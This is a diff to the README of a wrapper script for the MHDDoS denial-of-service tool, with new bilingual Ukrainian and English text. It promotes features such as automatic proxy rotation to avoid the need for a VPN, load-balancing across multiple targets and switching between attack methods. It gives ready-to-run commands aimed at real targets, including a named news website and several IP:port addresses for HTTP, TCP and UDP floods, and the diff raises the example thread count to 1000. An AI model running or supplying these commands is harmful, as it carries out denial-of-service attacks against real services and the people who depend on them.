@@ -1,4 +1,22 @@
-## Setup
+## Інтро
+
+Скрипт-обгортка для запуску потужного DDoS інструмента [MHDDoS](https://github.com/MHProDev/MHDDoS).
+
+- Не потребує VPN - автоматично скачує і підбирає робочі проксі для заданих цілей, періодично їх оновлюючи
+- Підтримує атаку декількох цілей з автоматичним балансуванням навантаження
+- Використовує різні методів для атаки і змінює їх в процесі роботи
+- Простий та зрозумілий інтерфейс з іменованими параметрами
+
+## Intro
+
+Wrapper script for running [MHDDoS](https://github.com/MHProDev/MHDDoS)
+
+- No VPN required - automatically downloads and selects working proxies for given targets
+- Support for multiple targets with automatic load-balancing
+- Uses multiple attack methods and switches between them
+- Simpler interface with named arguments
+
+## Setup | Налаштування
 
 ### Docker
 
@@ -11,7 +29,7 @@
     git clone https://github.com/MHProDev/MHDDoS.git
     python3 -m pip install -r MHDDoS/requirements.txt
 
-## Running
+## Running | Запуск
 
 ### Docker
 
@@ -21,7 +39,7 @@
 
     python3 runner.py COMMAND
 
-## Usage
+## Usage | Використання
 
     usage: runner.py target [target ...]
                      [-t THREADS] 
@@ -52,11 +70,11 @@
                              Refer to MHDDoS docs for available options
                              (https://github.com/MHProDev/MHDDoS)
 
-# Examples
+# Examples | Приклади
 
 For HTTP(S) targets, attack method is randomly selected from `--http-methods` option (see above for the default).
 
-For TCP targets, attack method is TCP FLOOD  
+For TCP targets, attack method is TCP FLOOD
 
 For UDP targets, attack method is UDP FLOOD.   
 **VPN IS REQUIRED FOR UDP**, proxying is not supported.  
@@ -68,16 +86,16 @@ Separate parameter `--udp-threads` controls the load, the default is 1, **INCREA
 
 Target specification
 
-- HTTP(S) by URL  - `https://tvzvezda.ru` or `http://tvzvezda.ru` 
+- HTTP(S) by URL - `https://tvzvezda.ru` or `http://tvzvezda.ru`
 - HTTP by IP:PORT - `5.188.56.124:9000`
-- TCP by IP:PORT  - `tcp://194.54.14.131:4477`
-- UDP by IP:PORT  - `udp://217.175.155.100:53` - **REQUIRES VPN**
+- TCP by IP:PORT - `tcp://194.54.14.131:4477`
+- UDP by IP:PORT - `udp://217.175.155.100:53` - **REQUIRES VPN**
 
 Increase load
 
-    python3 runner.py -t 300 https://tvzvezda.ru
+    python3 runner.py -t 1000 https://tvzvezda.ru
 
-Update proxies less often (every 10 minutes)
+Update proxies less/more often
 
     python3 runner.py -p 600 https://tvzvezda.ru
 
